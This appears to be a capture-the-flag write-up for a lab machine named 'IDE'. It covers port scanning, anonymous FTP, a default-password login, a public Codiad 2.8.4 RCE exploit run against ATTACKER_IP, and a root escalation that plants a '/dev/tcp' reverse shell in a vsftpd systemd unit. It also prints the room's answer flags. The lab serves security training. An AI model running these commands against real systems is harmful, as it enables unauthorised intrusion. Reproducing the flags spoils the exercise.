# IDE

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.29 (Ubuntu)
62337/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 (Ubuntu)
```

---

## FTP

Going into FTP and trying anonymous, I got a file named `-`. I copied the file, named it `test`, and got this out of it:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

There are two people named john and drac. John’s password has been reset to default and there’s an image file. Pivoting to the web server.

<img width="1859" height="968" alt="Screenshot From 2025-09-02 21-53-28" src="https://github.com/user-attachments/assets/6d2b21c6-847f-41a8-8f33-c7f5b9f49908" />


---

## Web & Exploit

I tried the username `john` and password `password`. That worked.

Now I saw four different Python files and they all worked together. I found this exploit online for **Codiad 2.8.4**:

[https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)

Setting up the payload:

```bash
python exploit.py http://ide.thm:62337/ john password ATTACKER_IP 1234 linux
```

Follow the GIFs in the GitHub if confused. After getting in, I tried to read the first flag but didn’t have permission. Pivoting around and looking at `.bash_history`, I saw a password:

```
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

Switching to drac with that password worked, and I got the first flag:

> Q1: User flag
> A1: 02930d21a8eb009f6d26361b2d24a466

---

## Privilege Escalation

Doing `sudo -l` as drac:

```
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

I checked the systemd unit file for vsftpd at `/lib/systemd/system/vsftpd.service`. Normally it contains the instructions for systemd to launch the FTP server.

I edited the file and changed the `ExecStart` line so instead of starting `/usr/sbin/vsftpd`, it ran my payload:

```bash
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'
```

After saving the file, I ran:

```bash
systemctl daemon-reload
sudo /usr/sbin/service vsftpd restart
```

Since I was allowed to restart vsftpd as root, systemd executed my malicious command as root instead of starting the FTP server.

With a netcat listener running:

```bash
nc -lvnp 9001
```

I caught a reverse shell and gained root.

---

## Flags

> Q1: User flag
> A1: 02930d21a8eb009f6d26361b2d24a466

> Q2: Root flag
> A2: ce258cb16f47f1c66f0b0b77f4e0fb8d
